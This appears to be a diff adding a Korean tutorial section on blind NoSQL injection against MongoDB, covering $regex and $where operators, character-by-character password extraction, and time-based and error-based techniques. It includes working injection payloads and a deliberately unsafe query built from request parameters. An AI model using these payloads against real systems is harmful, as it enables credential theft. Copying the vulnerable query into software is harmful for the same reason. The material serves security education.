@@ -110,3 +110,121 @@ http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
 ```
 
 위는 `$ne` 연산자를 사용해, `uid`와 `upw`가 `"a"`가 아닌 데이터를 조회하는 공격 쿼리의 실행 결과이다.
+
+참고로 `uid[$ne]=a` 형식으로 전달하면, `uid`에는 `{ '$ne' : 'a' }`가 저장된다.
+
+# Blind NoSQL Injection
+
+NoSQL Injection에서는 쿼리문을 조작하여 로그인 인증을 우회하는 방법을 알아보았다.
+
+Blind SQL Injection 공격을 통해서는 여기에 더해서 `True/False` 리턴 값을 통해 관리자 계정의 비밀번호와 같은 **데이터베이스의 정보**를 알아낼 수 있다.
+
+MongoDB에서는 `$regex`, `$where` 연산자를 사용하여 Blind NoSQL Injection 공격을 수행할 수 있다.
+
+아래 표는 각 연산자에 대해서 설명한 표이며, [공식 문서](https://docs.mongodb.com/manual/reference/operator/query/)를 통해 더 많은 연산자를 확인할 수 있다.
+
+| Name   | Description                                                |
+|--------|------------------------------------------------------------|
+| `$expr`  | 쿼리 언어 내에서 **집계 식**을 사용할 수 있습니다.             |
+| `$regex` | 지정된 **정규식**과 일치하는 문서를 선택합니다.                |
+| `$text`  | 지정된 **텍스트를 검색**합니다.                                |
+| `$where` | **JavaScript 표현**식을 만족하는 문서를 선택합니다.             |
+
+## `$regex`
+
+**정규식을 사용하여 식과 일치하는 데이터를 조회한다.** 아래는 `upw`에서 각 문자로 시작하는 데이터를 조회하는 쿼리의 예시이다.
+
+```
+> db.user.find({upw: {$regex: "^a"}})
+> db.user.find({upw: {$regex: "^b"}})
+> db.user.find({upw: {$regex: "^c"}})
+...
+> db.user.find({upw: {$regex: "^g"}})
+{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
+```
+
+## `$where`
+
+`$where` 뒤의 쿼리문이 `True`를 리턴하는 `Document`를 찾는다고 생각하면 된다.
+
+### 1. 표현식
+
+**`Javascript` 표현식을 만족하는 데이터를 조회한다.**
+
+```
+> db.user.find({$where:"return 1==1"})
+{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
+
+> db.user.find({uid:{$where:"return 1==1"}})
+error: {
+	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
+	"code" : 17287
+}
+```
+
+코드를 살펴보면, `return 1 == 1`이 항상 `True`를 리턴하기 때문에 모든 문서를 반환한다. 그리고 해당 연산자는 **`field`에서 사용할 수 없는 것을 확인할 수 있다.**
+
+### 2. `substring`
+
+해당 연산자로 `javascript` 표현식을 입력하면, 앞에서 배웠던 Blind SQL Injection에서 `substr`을 사용한 것과 같이 각 자리의 데이터를 알아낼 수 있따.
+
+아래 쿼리는 `upw`의 첫 글자를 비교해 데이터를 알아내는 쿼리이다. 참고로 `substr`은 `1-index` 였지만, `substring`인 `0-index`이다.
+
+```
+> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
+> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
+> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
+...
+> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
+{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
+```
+
+### 3. `Sleep` 함수를 통한 Time based Injection
+
+MongoDB는 `sleep` 함수를 제공한다. 이 함수를 표현식과 함께 사용하면 **지연 시간을 통해 `True/False` 결과를 확인할 수 있다.**
+
+아래 쿼리는 `upw`의 첫 글자를 비교하고, 해당 표현식이 참을 반환할 때 `sleep` 함수를 실행하는 쿼리이다.
+
+```
+db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
+/*
+/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
+/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
+/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
+...
+/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
+=> 시간 지연 발생.
+*/
+```
+
+위의 코드에서 시간 지연이 발생하는 `/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1`가 파라미터로 전달된다고 생각해보자. (`upw`는 파라미터가 존재하지 않기 때문에 `undefined`)
+
+`uid`의 파라미터 값은 `guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1`이다.
+
+따라서, `this.uid == 'guest' && this.upw.substring(0,1) == 'g' && sleep(5000) && '1' && this.upw == ''` 표현식이 `True`가 되게 하는 `Document`가 리턴된다.
+
+그런데 잘보면, `this.upw == ''`는 `True`가 될 수 없기 때문에 해당 표현식은 절대 `True`를 리턴할 수 없다.
+
+하지만 `sleep` 함수의 존재 때문에, `this.uid == 'guest' && this.upw.substring(0,1) == 'g'` 까지가 `True`일 때만, **Short-circuit evaluation**에 의해 `sleep(5000)`이 호출되기 때문에 시간 지연으로 공격이 성공했는지 확인할 수 있다.
+
+참고로, `&&'1`은 쿼리문을 끝내기 위한 코드이며 `db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});` 쿼리문에서 `upw`가 일치해야 `True`가 리턴되기 때문에 `sleep` 함수를 통해서만 공격이 가능하다.
+
+### 4. Error based Injection
+
+Error based Injection은 에러를 기반으로 데이터를 알아내는 기법으로, Time based Injection과 거의 비슷한 방법으로 찾고자 하는 조건이 참인 경우에 **올바르지 않은 문법이 실행되도록 하여 고의로 에러를 발생시킨다.**
+
+```
+> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
+error: {
+	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
+	"code" : 16722
+}
+// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
+
+> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
+// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
+```
+
+위의 코드에서 `this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'`이라는 javascript 표현식이 실행되도록 쿼리문이 전달된다고 가정해보자.
+
+그럼, `this.uid=='guest'&&this.upw.substring(0,1)=='g'`까지가 `True`일 때만, **Short-circuit evaluation**에 의해 `asd`라는 잘못된 문법을 가지는 코드가 호출되기 때문에 `error` 발생을 통해 공격이 성공했는지 확인할 수 있다.
